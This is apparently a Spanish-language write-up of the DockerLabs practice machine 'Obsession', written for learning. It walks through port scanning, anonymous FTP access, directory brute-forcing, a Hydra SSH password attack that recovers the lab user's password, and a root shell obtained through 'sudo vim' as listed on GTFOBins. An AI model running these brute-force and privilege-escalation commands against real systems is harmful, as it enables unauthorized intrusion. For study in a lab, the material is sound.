# Obsession

## 📌 Información

| Campo             | Valor                                                  |
| ----------------- | ------------------------------------------------------ |
| Plataforma        | DockerLabs                                             |
| Máquina           | Obsession                                              |
| Dificultad        | Muy Fácil                                              |
| Sistema Operativo | Linux                                                  |
| Categoría         | Enumeración / Acceso Inicial / Escalada de Privilegios |


<img width="1013" height="640" alt="hero" src="https://github.com/user-attachments/assets/20583026-fcd6-49d1-a9c9-d82ce96c32b5" />


---

# 🎯 Objetivo

Obtener acceso inicial a la máquina **Obsession** y conseguir privilegios de **root**.

---

# 🛠 Herramientas

* Nmap
* Gobuster
* FTP
* Hydra
* SSH

# 🚀 COMENZANDO

● Descargar la VM de DockerLabs 

● Descomprimir la VM desde la terminal de Kali

```unzip Obsession.zip```

● Archivo descomprimido

```auto_deploy.sh```

● Pasar a Super_Usuario

```sudo su```

● Correr la VM

```sudo ./auto_deploy.sh Obsession.tar ```

<img width="1678" height="780" alt="Screenshot_2026-08-22_01_37_41" src="https://github.com/user-attachments/assets/292efbac-98b5-43c1-b66e-24aa8d2a223d" />


🔍 Enumeración

## 1. Descubrimiento del objetivo

Primero identificamos la dirección IP asignada a la máquina.

```bash
172.17.0.2
```
Comprobamos la conectividad:

```bash
ping -c 2 172.17.0.2
```

<img width="1072" height="343" alt="Screenshot_2026-08-22_01_40_15" src="https://github.com/user-attachments/assets/0ac1234e-3e15-4ac1-89e9-236f11efacc6" />


## 2. Nmap

Realizamos un escaneo de los puertos:

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

<img width="1056" height="778" alt="Screenshot_2026-08-22_01_43_54" src="https://github.com/user-attachments/assets/4f98d682-f6bd-40be-93b9-816aef849623" />

### 🔎 Resultados

Se identificaron los siguientes servicios:

* **21/tcp → FTP**
* **22/tcp → SSH**
* **80/tcp → HTTP**

Uno de los primeros hallazgos interesantes fue que el servicio FTP permitía **acceso anónimo**.

# 📂 Enumeración FTP

Al encontrar FTP abierto, comprobamos si permitía acceso anónimo:

```bash
ftp 172.17.0.2
```
Utilizamos:
```text
Usuario: anonymous
Contraseña: anonymous
```

<img width="496" height="305" alt="Screenshot_2026-08-22_16_48_44 (1)" src="https://github.com/user-attachments/assets/c755e606-0c7d-4668-93e4-35d826c9c25c" />

Una vez dentro, listamos los archivos:

```bash
ls
```

<img width="925" height="184" alt="Screenshot_2026-08-22_01_46_14" src="https://github.com/user-attachments/assets/addaf5e6-1434-42df-9071-1ecedc817eb7" />

Encontramos 2 archivos de texto.

chat-gonza.txt

pendientes.txt

miramos que contienen cada uno con el comando 

```bash
 less
```

<img width="1808" height="446" alt="Screenshot_2026-08-22_01_49_13" src="https://github.com/user-attachments/assets/1a400921-2a68-4e12-90b2-fc82000577b1" />

### 🔎 Hallazgos

Los archivos proporcionan información relacionada con usuarios y configuración de la máquina.

Entre la información obtenida aparecen posibles usuarios:

```text
Russoski
Gonza
```

Esta información será útil para continuar la enumeración.

# 🌐 Enumeración Web

Continuamos investigando el servicio HTTP.

Accedemos mediante:

```text
http://172.17.0.2
```

NO encontramos nada importante en http
es una pagina apache comun

# 📂 Enumeración de directorios

Utilizamos la erramienta Gobuster:

```bash
gobuster dir -u http://172.17.0.2 -w common.txt -x php,txt,js,py,html
```

<img width="826" height="773" alt="Screenshot_2026-08-22_16_18_35" src="https://github.com/user-attachments/assets/594f9b6d-2aac-4e99-8393-dc2a1d7841e2" />

### 🔎 Resultados

Se descubren 2 directorios interesantes:

```text
/backup
/important
```
Investigamos especialmente:

```text
/backup
```
Dentro encontramos:

```text
backup.txt
```

<img width="842" height="149" alt="Screenshot_2026-08-22_16_19_46" src="https://github.com/user-attachments/assets/7105e82d-f098-4692-b260-78affdc28ba5" />


El archivo proporciona información adicional relacionada con el usuario:

```text
russoski
```

# 💣 Acceso Inicial

Después de la enumeración tenemos un posible usuario:

```text
Usuario: russoski
```

Como SSH está abierto en el puerto 22, podemos intentar obtener las credenciales mediante un ataque de fuerza bruta controlado.

Utilizamos Hydra:

```bash
hydra -l russoski -P rockyou.txt ssh://172.17.0.2 -t 4 -V
```
Hydra consigue encontrar una contraseña válida:

```text
Usuario: russoski
Contraseña: iloveme
```

<img width="1352" height="298" alt="Screenshot_2026-08-22_17_07_14" src="https://github.com/user-attachments/assets/1b5e6803-3b99-45db-966a-b5c517472f0c" />


Utilizamos las credenciales para conectarnos mediante SSH:

```bash
ssh russoski@172.17.0.2
```

<img width="952" height="394" alt="Screenshot_2026-08-22_17_07_24" src="https://github.com/user-attachments/assets/4d18f906-206f-4317-83ea-e0c961645abe" />


Comprobamos el usuario actual:

```bash
whoami
```
Resultado:

```text
russoski
```

<img width="424" height="95" alt="Screenshot_2026-08-22_17_08_02" src="https://github.com/user-attachments/assets/8d1de8ed-9d4d-47eb-836b-b0de2206a1d1" />


# 🔑 Escalada de Privilegios

Una vez obtenido el acceso inicial, comenzamos a enumerar los privilegios del usuario.

Primero comprobamos los permisos de sudo:

```bash
sudo -l
```

<img width="1664" height="185" alt="Screenshot_2026-08-22_17_08_55" src="https://github.com/user-attachments/assets/c37532d6-8825-42d9-9f17-f16ce2d72d3d" />


Encontramos que el usuario puede ejecutar **Vim** con privilegios elevados sin necesidad de introducir una contraseña.

Esto puede permitirnos ejecutar comandos con privilegios de root.

---

# 🚀 Escalada mediante Vim

Buscamos la técnica correspondiente en GTFOBins.

Podemos utilizar:

```bash
sudo vim -c ':!/bin/sh'
```

<img width="395" height="226" alt="345146861-3d9d94db-1b34-4d85-b6d7-81c3b1e9ab1b" src="https://github.com/user-attachments/assets/afbe757d-217c-4b1f-8c9f-8106640c1edf" />


Esto permite ejecutar una shell desde Vim utilizando los privilegios elevados otorgados por `sudo`.

Comprobamos nuestros privilegios:

```bash
whoami
```
Resultado:

```text
root
```

<img width="659" height="142" alt="Screenshot_2026-08-22_17_24_48" src="https://github.com/user-attachments/assets/d630774d-f8d3-4479-90f8-bd22206b945a" />


# 👑 Acceso Root

Finalmente comprobamos que tenemos privilegios administrativos:

```bash
whoami
```
Resultado:

```text
root
```

<img width="127" height="86" alt="Screenshot_2026-08-22_17_24_48" src="https://github.com/user-attachments/assets/c6d6c032-7e41-438c-952c-2387ceb164f4" />


También podemos verificar:

```bash
id
```

<img width="509" height="105" alt="Screenshot_2026-08-22_17_48_09" src="https://github.com/user-attachments/assets/63aa0abf-575c-46b9-9a63-e4e1e9028849" />

cambiamos el prompt de la terminal

```bash
script /dev/null -c bash
```

<img width="634" height="94" alt="Screenshot_2026-08-22_17_53_37" src="https://github.com/user-attachments/assets/7a7ffc5c-e25d-4a41-b8b9-b7c6ccd9422b" />

Una vez dentro, listamos los archivos:
```bash
ls
```
Entro del directorio root se encuenta

un archivo llamado Video-Nagore-Fernandez.txt

miramos que contiene dentro con el comando 
```bash
cat
```

<img width="686" height="252" alt="Screenshot_2026-08-22_17_54_27" src="https://github.com/user-attachments/assets/2d2904e4-2e44-4fb8-b898-cfdceca723f7" />

LISTO MAQUINA HACKEADA😎👨‍💻👩‍💻

# 🧠 Lecciones Aprendidas

* La importancia de realizar una enumeración completa de los servicios.
* FTP anónimo puede exponer información sensible.
* Los archivos encontrados en FTP pueden proporcionar nombres de usuarios.
* El código fuente de una página web puede contener información útil.
* Gobuster permite descubrir directorios y archivos ocultos.
* Los usuarios descubiertos durante la enumeración pueden ser útiles para otros servicios.
* Hydra permite comprobar credenciales contra servicios como SSH en laboratorios autorizados.
* `sudo -l` es fundamental después de obtener acceso inicial.
* Los permisos incorrectos de `sudo` pueden permitir una escalada de privilegios.
* Programas como Vim pueden convertirse en una vía para obtener una shell privilegiada.

---

# 🏁 Conclusión

La máquina **Obsession** proporciona un entorno sencillo para practicar un flujo completo de pentesting.

El proceso comienza con la enumeración mediante Nmap, donde se identifican los servicios FTP, SSH y HTTP.

Posteriormente, el acceso FTP anónimo permite obtener información útil sobre los usuarios de la máquina.

La enumeración web proporciona información adicional y permite confirmar un usuario válido.

Después de identificar el usuario, se utiliza Hydra para obtener sus credenciales y acceder mediante SSH.

Finalmente, mediante la enumeración de privilegios con `sudo -l`, se descubre que Vim puede ejecutarse con privilegios elevados. Esto permite obtener una shell como **root**.

La cadena de ataque puede resumirse de la siguiente manera:

```text
Nmap
  ↓
FTP Anonymous
  ↓
Obtención de información
  ↓
Enumeración Web
  ↓
Gobuster
  ↓
Descubrimiento de usuario
  ↓
Hydra
  ↓
SSH
  ↓
sudo -l
  ↓
Vim
  ↓
Root
```

---

# ⚠️ Aviso

Esta práctica se realizó en un entorno creado intencionalmente para el aprendizaje de ciberseguridad.

Las técnicas documentadas deben utilizarse únicamente contra sistemas propios, laboratorios o sistemas para los cuales se tenga autorización explícita.
